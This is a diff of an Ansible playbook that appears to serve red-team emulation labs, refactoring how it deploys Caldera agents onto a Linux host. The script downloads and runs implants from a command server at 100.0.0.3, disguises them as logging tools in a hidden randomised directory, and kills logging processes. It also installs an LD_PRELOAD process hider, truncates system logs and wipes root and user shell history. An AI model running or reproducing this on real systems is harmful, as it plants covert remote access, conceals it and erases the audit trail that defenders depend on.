@@ -5,17 +5,26 @@
   gather_facts: yes
 
   vars:
-    # Base directory where tools are hidden
     deploy_base_dir: "/tmp/.syslogd_backup"
-    # Generate three random folder names (each 4 random characters)
-    random_folder1: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
-    random_folder2: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
-    random_folder3: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
-    # Final hidden directory (nested three levels deep)
-    deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"
     purge_logs: true
 
   tasks:
+    ###################################################################
+    # Generate stable random folder names ONCE
+    ###################################################################
+    - name: Generate consistent random folder names
+      set_fact:
+        random_folder1: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
+        random_folder2: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
+        random_folder3: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
+
+    - name: Set final hidden deploy path
+      set_fact:
+        deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"
+
+    ###################################################################
+    # Environment setup
+    ###################################################################
     - name: Install python3 and python3-pip
       package:
         name:
@@ -35,146 +44,60 @@
         state: directory
         mode: "0755"
 
+    ###################################################################
+    # Clean up existing agents if any (optional pre-clean)
+    ###################################################################
+    - name: Clean up any existing agents in /tmp or previous runs
+      shell: |
+        pkill -f splunk || true
+        pkill -f syslog || true
+        pkill -f graylog || true
+        pkill -f notlog || true
+        pkill -f ragdoll || true
+        rm -f /tmp/splunk* /tmp/syslog* /tmp/graylog* /tmp/notlog* /tmp/ragdoll* || true
+      ignore_errors: yes
 
     ###################################################################
-    # Deploy multiple Caldera agents based on agent name (in background)
+    # Deploy agents
     ###################################################################
-    
 
-    # === HTTP Agents (Sandcat) ===
-    - name: Deploy splunkd (HTTP)
+    # --- HTTP AGENTS (Sandcat) ---
+    - name: Deploy HTTP agents
       shell: |
         server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunkd
-        chmod +x splunkd
-        nohup ./splunkd -server "$server" -group red >/dev/null 2>&1 &
+        for name in splunkd splunk syslog graylog log notlog notlog-http; do
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
+          chmod +x "$name"
+          nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
+        done
 
-    - name: Deploy splunk (HTTP)
+    # --- HTML AGENTS (RagDoll) ---
+    - name: Deploy HTML agents
       shell: |
         server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunk
-        chmod +x splunk
-        nohup ./splunk -server "$server" -group red >/dev/null 2>&1 &
-
-    - name: Deploy syslog (HTTP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > syslog
-        chmod +x syslog
-        nohup ./syslog -server "$server" -group red >/dev/null 2>&1 &
-
-    - name: Deploy graylog (HTTP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > graylog
-        chmod +x graylog
-        nohup ./graylog -server "$server" -group red >/dev/null 2>&1 &
-
-    - name: Deploy log (HTTP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > log
-        chmod +x log
-        nohup ./log -server "$server" -group red >/dev/null 2>&1 &
-
-    - name: Deploy notlog (HTTP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > notlog
-        chmod +x notlog
-        nohup ./notlog -server "$server" -group red >/dev/null 2>&1 &
-
-    - name: Deploy notlog-http (HTTP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > notlog-http
-        chmod +x notlog-http
-        nohup ./notlog-http -server "$server" -group red >/dev/null 2>&1 &
-
-    # === HTML Agents (RagDoll) ===
-    - name: Deploy notlog-html (HTML)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > notlog-html.py
         pip install -q requests beautifulsoup4
-        nohup python3 notlog-html.py -W "$server/weather" >/dev/null 2>&1 &
+        for name in notlog-html syslog-html log-html ragdoll; do
+          curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > "$name.py"
+          nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
+        done
 
-    - name: Deploy syslog-html (HTML)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > syslog-html.py
-        pip install -q requests beautifulsoup4
-        nohup python3 syslog-html.py -W "$server/weather" >/dev/null 2>&1 &
-
-    - name: Deploy log-html (HTML)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > log-html.py
-        pip install -q requests beautifulsoup4
-        nohup python3 log-html.py -W "$server/weather" >/dev/null 2>&1 &
-
-    - name: Deploy ragdoll (HTML)
-      shell: |
-        server="http://100.0.0.3:8888"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > ragdoll.py
-        pip install -q requests beautifulsoup4
-        nohup python3 ragdoll.py -W "$server/weather" >/dev/null 2>&1 &
-
-    # === Manx TCP Agents ===
-    - name: Deploy notlog-tcp (Manx TCP)
+    # --- TCP AGENTS (Manx) ---
+    - name: Deploy TCP agents
       shell: |
         server="http://100.0.0.3:8888"
         socket="100.0.0.3:7010"
         contact="tcp"
         cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > notlog-tcp
-        chmod +x notlog-tcp
-        nohup ./notlog-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
-
-    - name: Deploy syslog-tcp (Manx TCP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        socket="100.0.0.3:7010"
-        contact="tcp"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > syslog-tcp
-        chmod +x syslog-tcp
-        nohup ./syslog-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
-
-    - name: Deploy log-tcp (Manx TCP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        socket="100.0.0.3:7010"
-        contact="tcp"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > log-tcp
-        chmod +x log-tcp
-        nohup ./log-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
-
-    - name: Deploy splunk-tcp (Manx TCP)
-      shell: |
-        server="http://100.0.0.3:8888"
-        socket="100.0.0.3:7010"
-        contact="tcp"
-        cd {{ deploy_dir }}
-        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > splunk-tcp
-        chmod +x splunk-tcp
-        nohup ./splunk-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
-
+        for name in notlog-tcp syslog-tcp log-tcp splunk-tcp; do
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
+          chmod +x "$name"
+          nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
+        done
 
     ###################################################################
-    # 5) Copy and build the process hider
+    # Build and install process hider
     ###################################################################
     - name: Copy processhider.c from hideprocesses folder
       copy:
@@ -194,31 +117,31 @@
         chdir: "{{ deploy_dir }}"
       ignore_errors: yes
 
-    - name: Compile process hider (fallback if make did not work)
+    - name: Compile process hider manually (fallback)
       shell: gcc -Wall -fPIC -shared -o process.so processhider.c -ldl
       args:
         chdir: "{{ deploy_dir }}"
       ignore_errors: yes
 
-    - name: Move process.so to /usr/local/lib and update ld.so.preload
+    - name: Move compiled .so and update /etc/ld.so.preload
       shell: |
         mv {{ deploy_dir }}/process.so /usr/local/lib/ 2>/dev/null || true
         grep -qxF "/usr/local/lib/process.so" /etc/ld.so.preload || echo "/usr/local/lib/process.so" >> /etc/ld.so.preload
 
     ###################################################################
-    # 6) Cleanup: Remove the hidden deployment directory and clear logs/history
+    # Clean up only source files, not the deployed agents
     ###################################################################
-    - name: Remove processhider.c after build
+    - name: Remove processhider source files
       file:
-        path: "{{ deploy_dir }}/processhider.c"
+        path: "{{ item }}"
         state: absent
+      loop:
+        - "{{ deploy_dir }}/processhider.c"
+        - "{{ deploy_dir }}/Makefile"
 
-    - name: Remove Makefile after build
-      file:
-        path: "{{ deploy_dir }}/Makefile"
-        state: absent
-
-
+    ###################################################################
+    # Log and history cleanup
+    ###################################################################
     - block:
         - name: Truncate syslog (Debian/Ubuntu)
           shell: "truncate -s 0 /var/log/syslog 2>/dev/null || true"
@@ -241,6 +164,7 @@
             [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history 2>/dev/null || true
             history -c 2>/dev/null || true
             history -w 2>/dev/null || true
+
         - name: Clear primary user's bash history (john_hammond)
           shell: |
             [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history 2>/dev/null || true
